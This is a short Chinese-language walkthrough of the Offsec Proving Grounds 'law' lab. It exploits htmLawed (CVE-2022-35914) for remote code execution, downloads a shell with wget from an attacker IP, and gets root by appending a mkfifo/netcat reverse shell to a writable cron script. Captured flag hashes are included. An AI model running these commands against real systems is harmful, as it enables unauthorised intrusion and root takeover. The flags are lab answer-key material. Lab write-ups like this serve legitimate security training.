参考资料：  
law
 
[https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/law.md](https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/law.md)
   

枚举 web 服务器并识别目标系统上运行的 HTM LAWED。  
利用 RCE 漏洞 (CVE-2022-35914) 获取 www-data 的反向 shell。  
枚举系统以识别 /var/www/ 中可写的 cron 执行的 cleanup.sh 脚本。  
修改 cleanup.sh 脚本以提升权限，例如启用 /bin/bash 的 SUID 位。  
执行 /bin/bash -p 以提升权限并获得 root 访问权限。
 
192.168.230.190
    
python CVE-2022-35914.py -u [http://192.168.230.190](http://192.168.230.190) -c "wget [http://192.168.45.205/shell_9001](http://192.168.45.205/shell_9001)"
   

[http://192.168.45.205/shell_9001](http://192.168.45.205/shell_9001)
   

python CVE-2022-35914.py -u [http://192.168.230.190](http://192.168.230.190) -c "chmod +x shell_9001; ./shell_9001"
 
python CVE-2022-35914.py -u [http://192.168.230.190](http://192.168.230.190) -c "chmod +x shell_9001"
    
diyige
 
www-data@law:/var/www$ cat local.txt  
cat local.txt  
f506cb4024b0936d5bb7b8128af28d58  
www-data@law:/var/www$
 
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\>&1|nc 192.168.45.205 9002 \>/tmp/f" \>\> cleanup.sh
    
root  
connect to [192.168.45.205] from (UNKNOWN) [192.168.230.190] 34036  
/bin/sh: 0: can't access tty; job control turned off  
# uid=0(root) gid=0(root) groups=0(root)  
# uid=0(root) gid=0(root) groups=0(root)  
# email3.txt  
proof.txt  
# email3.txt  
proof.txt  
# uid=0(root) gid=0(root) groups=0(root)  
# cat proof.txt  
d3c996a8331d035d65577386da9daa22  
#
 
注意脚本执行的时候会有一些延时 耐心等待